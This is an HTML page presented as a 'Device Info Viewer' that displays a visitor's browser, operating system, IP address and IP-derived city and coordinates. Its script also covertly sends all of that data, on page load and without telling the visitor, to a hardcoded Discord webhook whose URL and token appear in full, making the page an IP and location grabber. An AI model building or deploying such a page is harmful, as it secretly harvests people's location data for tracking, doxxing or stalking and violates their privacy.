<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Info Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #121212;
            color: #ffffff;
        }
        h1 {
            color: #ffffff;
        }
        .info {
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #444;
            border-radius: 5px;
            background: #1e1e1e;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
            display: inline-block;
            min-width: 300px;
        }
        p {
            color: #dddddd;
        }
    </style>
</head>
<body>
    <h1>Your Device Information</h1>
    <div id="deviceInfo" class="info">
        <p>Loading device data...</p>
    </div>

    <script>
        async function getDeviceInfo() {
            const infoDiv = document.getElementById('deviceInfo');

            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const screenWidth = window.screen.width;
            const screenHeight = window.screen.height;

            let ipAddress = 'Fetching...';
            let positionData = {
                city: 'Fetching...',
                region: 'Fetching...',
                timezone: 'Fetching...',
                latitude: 'Fetching...',
                longitude: 'Fetching...'
            };

            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ipAddress = ipData.ip;

                const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                const geoData = await geoResponse.json();
                positionData = {
                    city: geoData.city,
                    region: geoData.region,
                    timezone: geoData.timezone,
                    latitude: geoData.latitude,
                    longitude: geoData.longitude
                };
            } catch (error) {
                console.error('Error fetching location data:', error);
            }

            const deviceData = {
                browser: userAgent,
                operatingSystem: platform,
                language: language,
                screenResolution: `${screenWidth} x ${screenHeight}`,
                ipAddress: ipAddress,
                city: positionData.city,
                region: positionData.region,
                timezone: positionData.timezone,
                latitude: positionData.latitude,
                longitude: positionData.longitude
            };

            infoDiv.innerHTML = `
                <p><strong>Browser:</strong> ${deviceData.browser}</p>
                <p><strong>Operating System:</strong> ${deviceData.operatingSystem}</p>
                <p><strong>Language:</strong> ${deviceData.language}</p>
                <p><strong>Screen Resolution:</strong> ${deviceData.screenResolution}</p>
                <p><strong>Your IP Address:</strong> ${deviceData.ipAddress}</p>
                <p><strong>City:</strong> ${deviceData.city}</p>
                <p><strong>Region:</strong> ${deviceData.region}</p>
                <p><strong>Time Zone:</strong> ${deviceData.timezone}</p>
                <p><strong>Coordinates:</strong> ${deviceData.latitude}, ${deviceData.longitude}</p>
            `;

            // Send the data to the webhook
            try {
                await fetch('https://discordapp.com/api/webhooks/1330513852315734076/cHE5eHxuscj1irA0SDp4wJOz-SwQnVWzGl1IHibnNa8-MEuU0pgSD6jr6FXrPx72vsVB', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: `Device Data:\nBrowser: ${deviceData.browser}\nOperating System: ${deviceData.operatingSystem}\nLanguage: ${deviceData.language}\nScreen Resolution: ${deviceData.screenResolution}\nIP Address: ${deviceData.ipAddress}\nCity: ${deviceData.city}\nRegion: ${deviceData.region}\nTime Zone: ${deviceData.timezone}\nCoordinates: ${deviceData.latitude}, ${deviceData.longitude}`
                    })
                });
            } catch (error) {
                console.error('Error sending data to webhook:', error);
            }
        }

        // Call the function to display and send device info
        getDeviceInfo();
    </script>
</body>
</html>
